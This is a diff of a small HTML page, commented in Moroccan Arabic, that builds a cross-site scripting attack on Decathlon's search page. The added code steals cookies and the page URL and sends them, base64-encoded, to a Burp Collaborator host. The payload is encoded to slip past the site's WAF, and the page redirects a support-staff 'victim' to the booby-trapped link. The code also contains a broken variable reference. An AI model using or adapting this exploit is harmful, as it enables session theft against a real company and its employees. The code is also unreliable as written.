@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Audit Proof - Decathlon</title>
-</head>
 <body>
-    <h1>System Loading...</h1>
     <script>
-        // 1. حط هنا رابط الـ Collaborator ديالك اللي جبتي من Burp
-        var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com"; 
+        // 1. هاد الكود هو "السم" (Payload) اللي غيتنفذ داخل Decathlon
+        let exploit = `
+            var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
+            var exfil = {
+                target: "DECATHLON_HACKED",
+                cookies: document.cookie,
+                url: window.location.href
+            };
+            var data = btoa(JSON.stringify(exfil));
+            window.location.href = collab + "/?leaked=" + data;
+        `;
 
-        // 2. غانجمعو المعلومات اللي كنقدرو نوصلو ليها
-        var exfil = {
-            domain: document.domain,
-            cookies: document.cookie, // غايجبد غير اللي ماشي HttpOnly
-            ua: navigator.userAgent,
-            ref: document.referrer
-        };
+        // 2. تشفير الكود باش يدوز من الـ WAF ديالهم
+        let encodedExploit = btoa(exploit);
 
-        // 3. تشفير البيانات بـ Base64
-        var payload = btoa(unescape(encodeURIComponent(JSON.stringify(exfil))));
+        // 3. رابط Decathlon الملغم بالـ XSS
+        // استعملنا svg حيت كيدوز من الفلاتر مزيان
+        let decathlonXss = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + encodedPayload + "'))>";
 
-        // 4. إرسال التبليغ لـ Burp بزز منه عبر Redirect
-        // هاد الطريقة هي اللي وصلاتك لـ 404 فـ السكرين اللخرة
-        window.location.href = collab + "/?data=" + payload;
+        // 4. تحويل الضحية (Support) للرابط الملغم
+        window.location.href = decathlonXss;
     </script>
 </body>
 </html>
